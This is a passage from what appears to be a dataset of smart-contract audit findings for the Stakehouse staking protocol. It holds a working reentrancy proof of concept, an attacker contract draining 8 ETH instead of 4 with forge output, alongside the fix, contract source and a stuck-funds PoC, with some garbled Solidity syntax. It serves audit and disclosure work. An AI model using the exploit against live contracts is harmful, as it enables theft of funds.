{\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance = 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n\n\nNote the section:\n\nsolidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n\nIf the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.\n\nAs shown in our running POC.\n\nWe need to add the import first:\n\nsolidity\nimport { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";\n\n\nWe can add the smart contract below:\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\n\nsolidity\ninterface IManager {\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable;\n    function withdrawETHForKnot(\n        address _recipient, \n        bytes calldata _blsPublicKeyOfKnot\n    ) external;\n}\n\ncontract NonEOARepresentative {\n\n    address manager;\n    bool state;\n\n    constructor(address _manager) payable {\n\n        bytes[] memory publicKeys = new bytes[(2);\n        publicKeys[0] = \"publicKeys1\";\n        publicKeys[1] = \"publicKeys2\";\n\n        bytes[] memory signature = new bytes[(2);\n        signature[0] = \"signature1\";\n        signature[1] = \"signature2\";\n\n        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(\n            publicKeys,\n            signature,\n            address(this)\n        );\n\n        manager = _manager;\n\n    }\n\n    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n    }\n\n    receive() external payable {\n        if(!state) {\n            state = true;\n            this.withdraw(\"publicKeys1\");\n        }\n    }\n\n}\n\n\nThere is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.\n\nWe add the test case.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35\n\nsolidity\nfunction testBypassIsContractCheck_POC() public {\n\n\tNonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));\n\taddress wallet = manager.smartWalletOfNodeRunner(address(pass));\n\taddress reprenstative = manager.smartWalletRepresentative(wallet);\n\tconsole.log(\"smart contract registered as a EOA representative\");\n\tconsole.log(address(reprenstative) == address(pass));\n\n\t// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED\n\tMockAccountManager(factory.accountMan()).setLifecycleStatus(\"publicKeys1\", 1);\n\n\t// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER\n\tpass.withdraw(\"publicKeys1\");\n\tconsole.log(\"balance after the withdraw, expected 4 ETH, but has 8 ETH\");\n\tconsole.log(address(pass).balance);\n\n}\n\n\nWe run the test:\n\nsolidity\nforge test -vv --match testWithdraw_Reentrancy_POC\n\n\nAnd the result is\n\nsolidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\nPASS] testWithdraw_Reentrancy_POC() (gas: 578021)\nLogs:\n  smart contract registered as a EOA representative\n  true\n  balance after the withdraw, expected 4 ETH, but has 8 ETH\n  8000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 14.85ms\n\n\nThe function call is\n\npass.withdraw(\"publicKeys1\"), which calls\n\nsolidity\nfunction withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n\tIManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n}\n\n\nWhich trigger:\n\nsolidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n\n\nWhich triggers reentrancy to withdraw the fund again before the public key is banned.\n\nsolidity\nreceive() external payable {\n\tif(!state) {\n\t\tstate = true;\n\t\tthis.withdraw(\"publicKeys1\");\n\t}\n}\n\n\n",
                "Repair": "\nWe recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.\n\nsolidity\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\n\n/// @dev For pools accepting ETH for validator staking, this contract will manage issuing LPs for deposits\nabstract contract ETHPoolLPFactory is StakehouseAPI {\n\n    /// @notice signalize withdrawing of ETH by depositor\n    event ETHWithdrawnByDepositor(address depositor, uint256 amount);\n\n    /// @notice signalize burning of LP token\n    event LPTokenBurnt(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @notice signalize issuance of new LP token\n    event NewLPTokenIssued(bytes blsPublicKeyOfKnot, address token, address firstDepositor, uint256 amount);\n\n    /// @notice signalize issuance of existing LP token\n    event LPTokenMinted(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @dev Base name and symbol used for deploying new LP tokens per KNOT\n    string internal baseLPTokenName;\n    string internal baseLPTokenSymbol;\n\n    /// @notice count of unique LP tokens issued for ETH deposits\n    uint256 public numberOfLPTokensIssued;\n\n    /// @notice Maximum amount that can be staked per validator in WEI\n    uint256 public maxStakingAmountPerValidator;\n\n    /// @notice Minimum amount that can be staked per validator in WEI\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Factory for the deployment of KNOT<>LP Tokens that can be used to redeem dETH\n    LPTokenFactory public lpTokenFactory;\n\n    /// @notice LP token address deployed for a KNOT's BLS public key\n    mapping(bytes => LPToken) public lpTokenForKnot;\n\n    /// @notice KNOT BLS public key associated with the LP token\n    mapping(LPToken => bytes) public KnotAssociatedWithLPToken;\n\n    /// @notice Allow users to rotate the ETH from many LP to another in the event that a BLS key is never staked\n    /// @param _oldLPTokens Array of old LP tokens to be burnt\n    /// @param _newLPTokens Array of new LP tokens to be minted in exchange of old LP tokens\n    /// @param _amounts Array of amount of tokens to be exchanged\n    function batchRotateLPTokens(\n        LPToken[] calldata _oldLPTokens,\n        LPToken[] calldata _newLPTokens,\n        uint256[] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _oldLPTokens.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n\n        for (uint256 i; i < numOfRotations; ++i) {\n            rotateLPTokens(\n                _oldLPTokens[i],\n                _newLPTokens[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked\n    /// @param _oldLPToken Instance of the old LP token (to be burnt)\n    /// @param _newLPToken Instane of the new LP token (to be minted)\n    /// @param _amount Amount of LP tokens to be rotated/converted from old to new\n    function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n        require(address(_oldLPToken) != address(0), \"Zero address\");\n        require(address(_newLPToken) != address(0), \"Zero address\");\n        require(_oldLPToken != _newLPToken, \"Incorrect rotation to same token\");\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _oldLPToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Liquidity is still fresh\");\n        require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n\n        bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n        bytes memory blsPublicKeyOfNewKnot = KnotAssociatedWithLPToken[_newLPToken];\n\n        require(blsPublicKeyOfPreviousKnot.length == 48, \"Incorrect BLS public key\");\n        require(blsPublicKeyOfNewKnot.length == 48, \"Incorrect BLS public key\");\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfNewKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        // burn old tokens and mint new ones\n        _oldLPToken.burn(msg.sender, _amount);\n        emit LPTokenBurnt(blsPublicKeyOfPreviousKnot, address(_oldLPToken), msg.sender, _amount);\n\n        _newLPToken.mint(msg.sender, _amount);\n        emit LPTokenMinted(KnotAssociatedWithLPToken[_newLPToken], address(_newLPToken), msg.sender, _amount);\n    }\n\n    /// @dev Internal business logic for processing staking deposits for single or batch deposits\n    function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");\n        require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");\n\n        // LP token issued for the KNOT\n        // will be zero for a new KNOT because the mapping doesn't exist\n        LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if(address(lpToken) != address(0)) {\n            // KNOT and it's LP token is already registered\n            // mint the respective LP tokens for the user\n\n            // total supply after minting the LP token must not exceed maximum staking amount per validator\n            require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            lpToken.mint(msg.sender, _amount);\n            emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);\n        }\n        else {\n            // check that amount doesn't exceed max staking amount per validator\n            require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n            \n            // mint new LP tokens for the new KNOT\n            // add the KNOT in the mapping\n            string memory tokenNumber = Strings.toString(numberOfLPTokensIssued);\n            string memory tokenName = string(abi.encodePacked(baseLPTokenName, tokenNumber));\n            string memory tokenSymbol = string(abi.encodePacked(baseLPTokenSymbol, tokenNumber));\n\n            // deploy new LP token and optionally enable transfer notifications\n            LPToken newLPToken = _enableTransferHook ?\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(this), tokenSymbol, tokenName)) :\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(0), tokenSymbol, tokenName));\n\n            // increase the count of LP tokens\n            numberOfLPTokensIssued++;\n\n            // register the BLS Public Key with the LP token\n            lpTokenForKnot[_blsPublicKeyOfKnot] = newLPToken;\n            KnotAssociatedWithLPToken[newLPToken] = _blsPublicKeyOfKnot;\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            newLPToken.mint(msg.sender, _amount);\n            emit NewLPTokenIssued(_blsPublicKeyOfKnot, address(newLPToken), msg.sender, _amount);\n        }\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { Test } from \"forge-std/Test.sol\";\n\nimport { MockLiquidStakingManager } from \"../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol\";\nimport { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";\nimport { SyndicateMock } from \"../../contracts/testing/syndicate/SyndicateMock.sol\";\nimport { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\nimport { LPTokenFactory } from \"../../contracts/liquid-staking/LPTokenFactory.sol\";\nimport { MockBrandNFT } from \"../../contracts/testing/stakehouse/MockBrandNFT.sol\";\nimport { MockStakeHouseUniverse } from \"../../contracts/testing/stakehouse/MockStakeHouseUniverse.sol\";\nimport { MockSlotRegistry } from \"../../contracts/testing/stakehouse/MockSlotRegistry.sol\";\nimport { MockLSDNFactory } from \"../../contracts/testing/liquid-staking/MockLSDNFactory.sol\";\nimport { OwnableSmartWalletFactory } from \"../../contracts/smart-wallet/OwnableSmartWalletFactory.sol\";\nimport { SavETHVaultDeployer } from \"../../contracts/liquid-staking/SavETHVaultDeployer.sol\";\nimport { StakingFundsVaultDeployer } from \"../../contracts/liquid-staking/StakingFundsVaultDeployer.sol\";\nimport { OptionalGatekeeperFactory } from \"../../contracts/liquid-staking/OptionalGatekeeperFactory.sol\";\nimport { MockSavETHVault } from \"../../contracts/testing/liquid-staking/MockSavETHVault.sol\";\nimport { MockStakingFundsVault } from \"../../contracts/testing/liquid-staking/MockStakingFundsVault.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\ncontract TestUtils is Test {\n\n    // Instances that can be shared across all test contracts\n    MockLSDNFactory factory;\n    MockLiquidStakingManager manager;\n    MockSavETHVault savETHVault;\n    MockStakingFundsVault stakingFundsVault;\n\n    /// Define some test BLS keys\n    bytes blsPubKeyOne = fromHex(\"94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5\");\n    bytes blsPubKeyTwo = fromHex(\"9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5\");\n    bytes blsPubKeyThree = fromHex(\"9AAdcff61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12fff\");\n    bytes blsPubKeyFour = fromHex(\"2aBdcff61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12fff\");\n\n    /// Define some test accounts\n    address accountOne = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;\n    address accountTwo = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;\n    address accountThree = 0xdD2FD4581271e230360230F9337D5c0430Bf44C0;\n    address accountFour = 0xbDA5747bFD65F08deb54cb465eB87D40e51B197E;\n    address accountFive = 0x2546BcD3c84621e976D8185a91A922aE77ECEc30;\n\n    address admin = 0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199;\n\n    address houseOne = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;\n    address houseTwo = 0xcd3B766CCDd6AE721141F452C550Ca635964ce71;\n\n    function getSavETHVaultFromManager(MockLiquidStakingManager _manager) public view returns (MockSavETHVault) {\n        return MockSavETHVault(address(_manager.savETHVault()));\n    }\n\n    function getStakingFundsVaultFromManager(MockLiquidStakingManager _manager) public view returns (MockStakingFundsVault) {\n        return MockStakingFundsVault(payable(address(_manager.stakingFundsVault())));\n    }\n\n    function depositIntoDefaultSavETHVault(address _user, bytes memory _blsKey, uint256 _amount) public {\n        vm.startPrank(_user);\n        savETHVault.depositETHForStaking{value: _amount}(_blsKey, _amount);\n        vm.stopPrank();\n    }\n\n    function depositIntoDefaultStakingFundsVault(address _user, bytes memory _blsKey, uint256 _amount) public {\n        vm.startPrank(_user);\n        manager.stakingFundsVault().depositETHForStaking{value: _amount}(_blsKey, _amount);\n        vm.stopPrank();\n    }\n\n    function depositStakeAndMintDerivativesForDefaultNetwork(\n        address _nodeRunner,\n        address _feesAndMevUser,\n        address _savETHUser,\n        bytes memory _blsKey\n    ) public {\n        registerSingleBLSPubKey(_nodeRunner, _blsKey, accountFour);\n        depositIntoDefaultSavETHVault(_savETHUser, _blsKey, 24 ether);\n        depositIntoDefaultStakingFundsVault(_feesAndMevUser, _blsKey, 4 ether);\n        stakeAndMintDerivativesSingleKey(_blsKey);\n    }\n\n    // Convert an hexadecimal character to their value\n    function fromHexChar(uint8 c) public pure returns (uint8) {\n        if (bytes1(c) >= bytes1('0') && bytes1(c) <= bytes1('9')) {\n            return c - uint8(bytes1('0'));\n        }\n        if (bytes1(c) >= bytes1('a') && bytes1(c) <= bytes1('f')) {\n            return 10 + c - uint8(bytes1('a'));\n        }\n        if (bytes1(c) >= bytes1('A') && bytes1(c) <= bytes1('F')) {\n            return 10 + c - uint8(bytes1('A'));\n        }\n        revert(\"fail\");\n    }\n\n    // Convert an hexadecimal string to raw bytes\n    function fromHex(string memory s) public pure returns (bytes memory) {\n        bytes memory ss = bytes(s);\n        require(ss.length%2 == 0); // length must be even\n        bytes memory r = new bytes(ss.length/2);\n        for (uint i=0; i<ss.length/2; ++i) {\n            r[i] = bytes1(fromHexChar(uint8(ss[2*i])) * 16 +\n                fromHexChar(uint8(ss[2*i+1])));\n        }\n        return r;\n    }\n\n    function getEmptyBytesArray() public pure returns (bytes[] memory) {\n        bytes[] memory array = new bytes[](0);\n        return array;\n    }\n\n    function getBytesArrayFromBytes(bytes memory data) public pure returns (bytes[] memory) {\n        bytes[] memory array = new bytes[](1);\n        array[0] = data;\n        return array;\n    }\n\n    function getBytesArrayFromBytes(bytes memory data, bytes memory data2) public pure returns (bytes[] memory) {\n        bytes[] memory array = new bytes[](2);\n        array[0] = data;\n        array[1] = data2;\n        return array;\n    }\n\n    function getBytesArrayFromBytes(bytes memory data, bytes memory data2, bytes memory data3) public pure returns (bytes[] memory) {\n        bytes[] memory array = new bytes[](3);\n        array[0] = data;\n        array[1] = data2;\n        array[2] = data3;\n        return array;\n    }\n\n    function getEmptyUint256Array() public pure returns (uint256[] memory) {\n        uint256[] memory array = new uint256[](0);\n        return array;\n    }\n\n    function getUint256ArrayFromValues(uint256 data) public pure returns (uint256[] memory) {\n        uint256[] memory array = new uint256[](1);\n        array[0] = data;\n        return array;\n    }\n\n    function getUint256ArrayFromValues(uint256 data, uint256 data2) public pure returns (uint256[] memory) {\n        uint256[] memory array = new uint256[](2);\n        array[0] = data;\n        array[1] = data2;\n        return array;\n    }\n\n    function getUint256ArrayFromValues(uint256 data, uint256 data2, uint256 data3) public pure returns (uint256[] memory) {\n        uint256[] memory array = new uint256[](3);\n        array[0] = data;\n        array[1] = data2;\n        array[2] = data3;\n        return array;\n    }\n\n    function getAddressArrayFromValues(address data) public pure returns (address[] memory) {\n        address[] memory array = new address[](1);\n        array[0] = data;\n        return array;\n    }\n\n    function getFakeEIP712Signature() public view returns (IDataStructures.EIP712Signature memory, IDataStructures.EIP712Signature[] memory) {\n        IDataStructures.EIP712Signature memory sig;\n        IDataStructures.EIP712Signature[] memory sigs = new IDataStructures.EIP712Signature[](1);\n        sigs[0] = sig;\n        return (sig, sigs);\n    }\n\n    function getFakeBalanceReport() public view returns (IDataStructures.ETH2DataReport memory, IDataStructures.ETH2DataReport[] memory) {\n        IDataStructures.ETH2DataReport memory report;\n        IDataStructures.ETH2DataReport[] memory reports = new IDataStructures.ETH2DataReport[](1);\n        reports[0] = report;\n        return (report, reports);\n    }\n\n    function getRandomArrayOfBytes32() public pure returns (bytes32[] memory) {\n        bytes32[] memory roots = new bytes32[](1);\n        roots[0] = keccak256(abi.encode(\"\"));\n        return roots;\n    }\n\n    function createMockLSDNFactory() public returns (MockLSDNFactory) {\n        // Create implementation contracts\n        MockLiquidStakingManager managerImplementation = new MockLiquidStakingManager();\n        SyndicateMock syndicateImplementation = new SyndicateMock();\n        LPToken lpTokenImplementation = new LPToken();\n\n        // Create periphery contracts\n        LPTokenFactory lpTokenFactory = new LPTokenFactory(address(lpTokenImplementation));\n        OwnableSmartWalletFactory smartWalletFactory = new OwnableSmartWalletFactory();\n        MockBrandNFT brand = new MockBrandNFT();\n        SavETHVaultDeployer vaultDeployer = new SavETHVaultDeployer();\n        StakingFundsVaultDeployer stakingFundsDeployer = new StakingFundsVaultDeployer();\n        OptionalGatekeeperFactory keeperDeployer = new OptionalGatekeeperFactory();\n\n        // Create LSDN factory\n        return new MockLSDNFactory(\n            address(managerImplementation),\n            address(managerImplementation), // MockLSDNFactory will override the _syndicateFactory param\n            address(lpTokenFactory),\n            address(smartWalletFactory),\n            address(brand),\n            address(vaultDeployer),\n            address(stakingFundsDeployer),\n            address(keeperDeployer)\n        );\n    }\n\n    function deployNewLiquidStakingNetwork(\n        MockLSDNFactory _factory,\n        address _admin,\n        bool _deployOptionalGatekeeper,\n        string memory _ticker\n    ) public returns (MockLiquidStakingManager) {\n        return MockLiquidStakingManager(payable(_factory.deployNewMockLiquidStakingDerivativeNetwork(\n                _admin,\n                _deployOptionalGatekeeper,\n                _ticker\n            )));\n    }\n\n    function deployDefaultLiquidStakingNetwork(\n        MockLSDNFactory _factory,\n        address _admin\n    ) public returns (MockLiquidStakingManager) {\n        return MockLiquidStakingManager(payable(_factory.deployNewMockLiquidStakingDerivativeNetwork(\n                _admin,\n                false,\n                \"LSDN\"\n            )));\n    }\n\n    function registerSingleBLSPubKey(\n        address _nodeRunner,\n        bytes memory _blsKey,\n        address _eoaRepresentative\n    ) public {\n        vm.deal(_nodeRunner, 4 ether);\n        vm.startPrank(_nodeRunner);\n        manager.registerBLSPublicKeys{ value: 4 ether }(\n            getBytesArrayFromBytes(_blsKey),\n            getBytesArrayFromBytes(_blsKey),\n            _eoaRepresentative\n        );\n        vm.stopPrank();\n\n        // Simulate state transitions in lifecycle status to initials registered (value of 1)\n        MockAccountManager(factory.accountMan()).setLifecycleStatus(_blsKey, 1);\n\n        // set user as first collateralized owner\n        MockSlotRegistry(factory.slot()).setNumberOfCollateralisedSlotOwnersForKnot(_blsKey, 1);\n        MockSlotRegistry(factory.slot()).setCollateralisedOwnerAtIndex(\n            _blsKey,\n            0,\n            manager.smartWalletOfNodeRunner(_nodeRunner)\n        );\n    }\n\n    function stakeSingleBlsPubKey(bytes memory _blsKey) public {\n        (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();\n        manager.stake(\n            getBytesArrayFromBytes(_blsKey),\n            getBytesArrayFromBytes(_blsKey),\n            getBytesArrayFromBytes(_blsKey),\n            sigs,\n            getRandomArrayOfBytes32()\n        );\n    }\n\n    function mintDerivativesSingleBlsPubKey(bytes memory _blsKey) public {\n        (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();\n        (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();\n\n        MockStakeHouseUniverse(factory.uni()).setAssociatedHouseForKnot(_blsKey, manager.stakehouse());\n\n        manager.mintDerivatives(\n            getBytesArrayFromBytes(_blsKey),\n            reports,\n            sigs\n        );\n\n        // set associated house info\n        MockSlotRegistry(factory.slot()).setUserCollateralisedSLOTBalanceForKnot(\n            manager.stakehouse(),\n            MockSlotRegistry(factory.slot()).getCollateralisedOwnerAtIndex(_blsKey, 0),  // get user that registered initials\n            _blsKey,\n            4 ether\n        );\n    }\n\n    function stakeAndMintDerivativesSingleKey(\n        bytes memory _blsKey\n    ) public {\n        // Stake the ETH with the deposit contract by spending 4 + 4 + 24 ETH from the individual pools\n        stakeSingleBlsPubKey(_blsKey);\n\n        // Simulate state transitions in lifecycle status to ETH deposited (value of 2)\n        MockAccountManager(factory.accountMan()).setLifecycleStatus(_blsKey, 2);\n\n        // Mint derivatives for the knot\n        mintDerivativesSingleBlsPubKey(_blsKey);\n\n        // Simulate state transitions in lifecycle status to derivatives minted (value of 3)\n        MockAccountManager(factory.accountMan()).setLifecycleStatus(_blsKey, 3);\n    }\n\n    function sendEIP1559RewardsToSyndicateAtAddress(uint256 _eip1559Reward, address _syndicate) public {\n        (bool success, ) = _syndicate.call{value: _eip1559Reward}(\"\");\n        assertEq(success, true);\n        assertEq(_syndicate.balance, _eip1559Reward);\n    }\n}\n\n",
        "CodeNames": [
            "ETHPoolLPFactory.sol",
            "TestUtils.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-06",
                "Location": [
                    "//solidity\n    function testStuckFundsInGiantMEV() public {\n\n        stakingFundsVault = MockStakingFundsVault(payable(manager.stakingFundsVault()));\n        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);\n        //address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        //address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        address victim = accountFour; vm.deal(victim, 1 ether);\n\n\n        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n        emit log_address(address(giantFeesAndMevPool));\n        vm.startPrank(victim);\n\n        emit log_uint(victim.balance);\n        giantFeesAndMevPool.depositETH{value: 1 ether}(1 ether);\n        bytes[][] memory blsKeysForVaults = new bytes[][(1);\n        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n        uint256[][] memory stakeAmountsForVaults = new uint256[][(1);\n        stakeAmountsForVaults[0] = getUint256ArrayFromValues(1 ether);\n        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);\n\n        emit log_uint(victim.balance);\n\n\n        vm.warp(block.timestamp + 60 minutes);\n        LPToken lp = (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));\n        LPToken ][] memory lpToken = new LPToken[][(1);\n        LPToken[] memory temp  = new LPToken[(1);\n        temp[0] = lp;\n        lpToken[0] = temp;\n\n        emit log_uint(address(giantFeesAndMevPool).balance);\n        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken, stakeAmountsForVaults);\n\n        emit log_uint(address(giantFeesAndMevPool).balance);\n        vm.expectRevert();\n        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);\n\n        vm.expectRevert();\n        giantSavETHPool.withdrawETH(1 ether);\n\n        vm.stopPrank();\n    }\n\n\n"
                ],
                "Type": "  BringUnusedETHBackIntoGiantPool  can cause stuck ether funds in Giant Pool",
                "Description": "*Submitted by koxuan(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115), also found by hihen(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/194)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158<br\n\nwithdrawUnusedETHToGiantPool will withdraw any eth from the vault if staking has not commenced(knot status is INITIALS_REGISTERED), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.\n\n\nPlace poc in GiantPools.t.sol with import { MockStakingFundsVault } from \"../../contracts/testing/liquid-staking/MockStakingFundsVault.sol\";\n\nsolidity\n    function testStuckFundsInGiantMEV() public {\n\n        stakingFundsVault = MockStakingFundsVault(payable(manager.stakingFundsVault()));\n        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);\n        //address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        //address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        address victim = accountFour; vm.deal(victim, 1 ether);\n\n\n        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n        emit log_address(address(giantFeesAndMevPool));\n        vm.startPrank(victim);\n\n        emit log_uint(victim.balance);\n        giantFeesAndMevPool.depositETH{value: 1 ether}(1 ether);\n        bytes[][] memory blsKeysForVaults = new bytes[][(1);\n        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n        uint256[][] memory stakeAmountsForVaults = new uint256[][(1);\n        stakeAmountsForVaults[0] = getUint256ArrayFromValues(1 ether);\n        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);\n\n        emit log_uint(victim.balance);\n\n\n        vm.warp(block.timestamp + 60 minutes);\n        LPToken lp = (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));\n        LPToken ][] memory lpToken = new LPToken[][(1);\n        LPToken[] memory temp  = new 